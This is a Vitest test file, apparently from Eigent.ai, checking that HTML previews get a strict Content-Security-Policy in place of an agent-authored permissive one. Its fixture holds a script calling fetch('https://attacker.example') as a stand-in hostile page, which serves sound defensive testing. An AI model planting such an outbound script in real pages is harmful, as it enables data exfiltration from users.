// ========= Copyright 2025-2026 @ Eigent.ai All Rights Reserved. =========
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ========= Copyright 2025-2026 @ Eigent.ai All Rights Reserved. =========

import { describe, expect, it } from 'vitest';
import {
  injectPreviewContentSecurityPolicy,
  PREVIEW_CONTENT_SECURITY_POLICY,
} from './htmlSanitization';

describe('HTML preview CSP', () => {
  it('replaces an agent-authored policy with the application policy', () => {
    const html = injectPreviewContentSecurityPolicy(`<!doctype html>
      <html><head>
        <meta http-equiv="Content-Security-Policy" content="default-src *">
      </head><body><script>fetch('https://attacker.example')</script></body></html>`);
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const policies = doc.querySelectorAll(
      'meta[http-equiv="Content-Security-Policy" i]'
    );

    expect(policies).toHaveLength(1);
    expect(policies[0].getAttribute('content')).toBe(
      PREVIEW_CONTENT_SECURITY_POLICY
    );
    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("default-src 'none'");
    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("connect-src 'none'");
    expect(PREVIEW_CONTENT_SECURITY_POLICY).not.toContain('https:');
  });
});
